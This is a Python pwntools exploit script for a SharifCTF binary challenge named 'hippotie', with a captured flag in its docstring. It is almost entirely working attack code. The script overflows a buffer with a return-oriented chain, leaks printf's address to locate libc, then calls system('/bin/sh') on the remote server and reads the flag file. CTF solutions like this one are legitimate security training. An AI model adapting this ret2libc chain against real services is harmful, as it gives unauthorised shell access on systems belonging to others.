#!/usr/bin/python

"""
$ cat /home/rooney/suctf/Hippotie/flag
SharifCTF{6b41e2849ed05d82e55ff730911bd8fb}
"""

from pwn import *

printf_plt = 0x0000000000400816
puts_plt = 0x4007f0
main = 0x401365
printf_got = 0x00000000006027B8
pop_rdi = 0x0000000000401483

libc_got = 0x6027d0

e = ELF("./libc.so.6")

#r = process("./hippotie")
r = remote("ctf.sharif.edu", 54519)
#r = remote("localhost", 5000)

raw_input("$ ")

r.sendlineafter("> ", "1")

r.sendlineafter("Name: ", "teet")
r.sendlineafter("Password: ", "teet")

r.sendlineafter("> ", "2")
# calculated using gdb
r.sendlineafter("Name: ", "\x11")
r.sendlineafter("Password: ", "\x11")

assert "Successfully Logged In!" in r.recvuntil("> ")

r.sendline("3")
r.sendlineafter("to pack? ", "A"*0x218+p64(pop_rdi)+p64(printf_got)+p64(puts_plt)+p64(main)) # run main again

r.sendlineafter("> ", "4")

r.recvline()
printf_leak = u64(r.recv(6).ljust(8, "\x00"))
print "printf_leak", hex(printf_leak)

libc_base = printf_leak - e.symbols["printf"]
system = libc_base + e.symbols["system"]
bin_sh = libc_base + next(e.search("/bin/sh"))
r.sendline("3")
r.sendlineafter("to pack? ", "A"*0x218+p64(pop_rdi)+p64(bin_sh)+p64(system)+p64(main))

r.sendlineafter("> ", "4")

#r.interactive()
r.sendline("cat /home/rooney/suctf/Hippotie/flag")
r.recv()

print "flag: ", r.recv()
r.close()
